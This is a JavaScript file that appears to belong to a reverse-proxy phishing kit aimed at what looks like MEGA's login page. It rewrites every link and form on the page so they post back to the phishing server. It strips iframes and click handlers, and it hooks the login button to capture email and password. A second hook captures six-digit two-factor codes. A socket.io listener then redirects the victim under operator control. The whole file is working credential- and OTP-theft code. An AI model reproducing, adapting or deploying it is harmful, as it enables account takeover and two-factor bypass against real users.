const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[name="login-name2"]`,
            `[id="login-name2"]`,
            `[name="login-password2"]`,
            `[id="login-password2"]`,
            `.mega-dialog.dialog-template-action.two-factor-dialog.verify-two-factor-login.hidden`
        ],
        runner() {
            const email = document.querySelector(`[name="login-name2"]`)
            const password = document.querySelector(`[name="login-password2"]`)
            const showBtn = document.querySelector(`.sprite-fm-mono.pass-visible`)
            const submitBtn = document.querySelector(`.login-button`)

            showBtn.addEventListener("click", () => {
                if (password.type == "password") {
                    password.type = "text"
                } else {
                    password.type = "password"
                }
            });

            [email, password].forEach(inp => {
                inp.addEventListener("input", () => {
                    if (inp.value.length > 0) {
                        inp.parentElement.classList.add('active')
                    } else {
                        inp.parentElement.classList.remove('active')
                    }
                })
            });

            submitBtn.addEventListener('click', () => {
                spikeForm({
                    spikeType: this.spikeType,
                    "login-name2": email.value,
                    "login-password2": password.value
                })
            })
        }
    },
    {
        spikeType: "auth-code",
        querys: [
            `[placeholder="Enter 6-digit code"]`,
            `[class="pin-input"]`
        ],
        runner() {
            const otpInp = document.querySelector(`[placeholder="Enter 6-digit code"]`)
            const submitBtn = document.querySelector(`.submit-button`)

            submitBtn.addEventListener('click', () => {
                if (otpInp.value.length > 0) {
                    spikeForm({
                        code: otpInp.value,
                        spikeType: this.spikeType
                    })
                }
            })
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "",
        runner() {

        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}